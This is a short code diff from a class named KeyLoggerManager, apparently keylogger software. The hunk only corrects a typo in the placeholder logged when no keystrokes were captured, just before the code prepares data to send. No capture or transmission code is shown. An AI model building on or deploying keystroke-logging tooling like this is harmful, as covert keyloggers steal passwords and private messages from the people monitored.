@@ -50,7 +50,7 @@ class KeyLoggerManager:
 
             # If no keystrokes, skip sending
             if not logged_keys:
-                logged_keys = ["NO keysb"]
+                logged_keys = ["NO keys"]
 
             # Prepare data to send
             data_to_send = {
